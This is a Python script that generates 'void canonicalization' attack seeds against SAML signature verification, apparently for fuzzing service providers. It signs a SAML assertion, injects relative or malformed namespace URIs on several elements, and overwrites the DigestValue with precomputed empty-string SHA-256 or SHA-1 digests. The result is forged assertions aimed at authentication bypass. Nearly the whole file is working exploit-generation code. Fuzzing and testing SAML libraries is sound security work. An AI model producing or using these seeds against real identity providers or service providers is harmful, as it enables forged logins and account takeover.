#!/usr/bin/env python3
"""Generate void canonicalization attack seed variants.

Creates seeds with:
- Various relative namespace URIs (empty, dot, numeric, path)
- Precomputed empty-string digest for SHA-256 and SHA-1
- Different namespace positions (Assertion, NameID, Subject, Conditions)
- SignedInfo c14n algorithm swaps
"""
from __future__ import annotations

import hashlib
import base64
import copy
import os
from pathlib import Path
from lxml import etree
from signxml import XMLSigner
from signxml.algorithms import SignatureConstructionMethod, CanonicalizationMethod

KEY_PATH = Path("targets/saml_fixtures/idp_key.pem")
CERT_PATH = Path("targets/saml_fixtures/idp_cert.pem")
OUT_DIR = Path("targets/saml_seeds_void_c14n")

NSMAP = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
}

# Precomputed empty-string digests
EMPTY_SHA256 = base64.b64encode(hashlib.sha256(b"").digest()).decode()
EMPTY_SHA1 = base64.b64encode(hashlib.sha1(b"").digest()).decode()

# Relative / malformed namespace URIs that trigger void c14n
VOID_NS_URIS = [
    ("1", "numeric relative"),
    ("", "empty URI"),
    (".", "dot relative"),
    ("relative/path", "path relative"),
    ("#", "fragment only"),
    ("//", "scheme relative"),
    ("?query", "query only"),
    ("%00", "null byte"),
    ("urn:", "bare urn scheme"),
    ("http:", "bare http scheme"),
    ("data:,", "data URI empty"),
]


def make_base_assertion():
    """Build a minimal valid SAML assertion."""
    resp = etree.Element(
        "{urn:oasis:names:tc:SAML:2.0:protocol}Response",
        nsmap={"samlp": NSMAP["samlp"], "saml": NSMAP["saml"]},
    )
    resp.set("ID", "_resp_void")
    resp.set("Version", "2.0")
    resp.set("IssueInstant", "2026-03-01T22:55:37Z")
    resp.set("Destination", "https://sp.example.com/acs")

    issuer = etree.SubElement(resp, "{urn:oasis:names:tc:SAML:2.0:assertion}Issuer")
    issuer.text = "https://idp.example.com"

    status = etree.SubElement(resp, "{urn:oasis:names:tc:SAML:2.0:protocol}Status")
    sc = etree.SubElement(status, "{urn:oasis:names:tc:SAML:2.0:protocol}StatusCode")
    sc.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

    assertion = etree.SubElement(
        resp, "{urn:oasis:names:tc:SAML:2.0:assertion}Assertion"
    )
    assertion.set("Version", "2.0")
    assertion.set("ID", "_assert_void")
    assertion.set("IssueInstant", "2026-03-01T22:55:37Z")

    a_issuer = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Issuer")
    a_issuer.text = "https://idp.example.com"

    subject = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Subject")
    nameid = etree.SubElement(subject, "{urn:oasis:names:tc:SAML:2.0:assertion}NameID")
    nameid.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress")
    nameid.text = "user@example.com"

    sc2 = etree.SubElement(subject, "{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmation")
    sc2.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
    scd = etree.SubElement(sc2, "{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmationData")
    scd.set("NotOnOrAfter", "2026-03-01T23:55:37Z")
    scd.set("Recipient", "https://sp.example.com/acs")

    conditions = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Conditions")
    conditions.set("NotBefore", "2026-03-01T22:55:37Z")
    conditions.set("NotOnOrAfter", "2026-03-01T23:55:37Z")
    ar = etree.SubElement(conditions, "{urn:oasis:names:tc:SAML:2.0:assertion}AudienceRestriction")
    aud = etree.SubElement(ar, "{urn:oasis:names:tc:SAML:2.0:assertion}Audience")
    aud.text = "https://sp.example.com"

    authn = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnStatement")
    authn.set("AuthnInstant", "2026-03-01T22:55:37Z")
    authn.set("SessionIndex", "_session_void")
    ac = etree.SubElement(authn, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnContext")
    acr = etree.SubElement(ac, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnContextClassRef")
    acr.text = "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"

    return resp, assertion


def sign_assertion(resp):
    """Sign the assertion inside the response."""
    key = KEY_PATH.read_bytes()
    cert = CERT_PATH.read_bytes()
    signer = XMLSigner(
        method=SignatureConstructionMethod.enveloped,
        digest_algorithm="sha256",
        signature_algorithm="rsa-sha256",
        c14n_algorithm=CanonicalizationMethod.EXCLUSIVE_XML_CANONICALIZATION_1_0,
    )
    assertion = resp.find(".//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
    signed = signer.sign(assertion, key=key, cert=cert)
    # Replace assertion in response
    resp.remove(assertion)
    resp.append(signed)
    return resp


def inject_void_ns(xml_bytes: bytes, ns_uri: str, prefix: str = "voidns",
                   target: str = "Assertion") -> bytes:
    """Inject xmlns:prefix='ns_uri' on the target element."""
    if target == "Assertion":
        marker = b"<saml:Assertion "
    elif target == "NameID":
        marker = b"<saml:NameID "
    elif target == "Subject":
        marker = b"<saml:Subject"
        # Subject may not have attributes, inject after tag name
        idx = xml_bytes.find(marker)
        if idx < 0:
            return xml_bytes
        end = xml_bytes.index(b">", idx)
        attr = f' xmlns:{prefix}="{ns_uri}"'.encode()
        return xml_bytes[:end] + attr + xml_bytes[end:]
    else:
        marker = b"<saml:Assertion "

    idx = xml_bytes.find(marker)
    if idx < 0:
        return xml_bytes
    insert_pos = idx + len(marker)
    attr = f'xmlns:{prefix}="{ns_uri}" '.encode()
    return xml_bytes[:insert_pos] + attr + xml_bytes[insert_pos:]


def replace_digest(xml_bytes: bytes, new_digest: str) -> bytes:
    """Replace DigestValue content with precomputed value."""
    import re
    return re.sub(
        rb"(<ds:DigestValue>)(.*?)(</ds:DigestValue>)",
        rb"\g<1>" + new_digest.encode() + rb"\g<3>",
        xml_bytes,
    )


def main():
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    # Check if signing is possible
    if not KEY_PATH.exists():
        print(f"Key not found at {KEY_PATH}, generating unsigned seeds only")
        can_sign = False
    else:
        can_sign = True

    seed_idx = 100  # start at 100 to not collide with existing seeds

    for ns_uri, desc in VOID_NS_URIS:
        for with_digest in [False, True]:
            resp, assertion = make_base_assertion()

            # Sign first (valid signature)
            if can_sign:
                resp = sign_assertion(resp)

            xml_bytes = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")

            # Inject void namespace
            xml_bytes = inject_void_ns(xml_bytes, ns_uri)

            # Optionally replace digest with precomputed empty hash
            if with_digest:
                xml_bytes = replace_digest(xml_bytes, EMPTY_SHA256)

            suffix = "precomputed" if with_digest else "raw"
            safe_desc = desc.replace(" ", "_").replace("/", "_")
            fname = f"void_c14n_{seed_idx:03d}_{safe_desc}_{suffix}.xml"
            (OUT_DIR / fname).write_bytes(xml_bytes)
            print(f"  {fname}")
            seed_idx += 1

    # Additional: multiple void namespaces stacked
    for count in [2, 3, 5]:
        resp, assertion = make_base_assertion()
        if can_sign:
            resp = sign_assertion(resp)
        xml_bytes = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        for i in range(count):
            xml_bytes = inject_void_ns(xml_bytes, str(i), prefix=f"v{i}")
        xml_bytes = replace_digest(xml_bytes, EMPTY_SHA256)
        fname = f"void_c14n_{seed_idx:03d}_stacked_{count}ns.xml"
        (OUT_DIR / fname).write_bytes(xml_bytes)
        print(f"  {fname}")
        seed_idx += 1

    # Additional: void ns on different elements
    for target_elem in ["NameID", "Subject"]:
        resp, assertion = make_base_assertion()
        if can_sign:
            resp = sign_assertion(resp)
        xml_bytes = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        xml_bytes = inject_void_ns(xml_bytes, "1", target=target_elem)
        xml_bytes = replace_digest(xml_bytes, EMPTY_SHA256)
        fname = f"void_c14n_{seed_idx:03d}_on_{target_elem.lower()}.xml"
        (OUT_DIR / fname).write_bytes(xml_bytes)
        print(f"  {fname}")
        seed_idx += 1

    # Additional: SHA-1 precomputed digest (some libs use sha1)
    resp, assertion = make_base_assertion()
    if can_sign:
        resp = sign_assertion(resp)
    xml_bytes = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
    xml_bytes = inject_void_ns(xml_bytes, "1")
    xml_bytes = replace_digest(xml_bytes, EMPTY_SHA1)
    # Also swap DigestMethod to sha1
    xml_bytes = xml_bytes.replace(
        b"http://www.w3.org/2001/04/xmlenc#sha256",
        b"http://www.w3.org/2000/09/xmldsig#sha1",
    )
    fname = f"void_c14n_{seed_idx:03d}_sha1_precomputed.xml"
    (OUT_DIR / fname).write_bytes(xml_bytes)
    print(f"  {fname}")
    seed_idx += 1

    print(f"\nGenerated {seed_idx - 100} void c14n seeds in {OUT_DIR}")


if __name__ == "__main__":
    main()
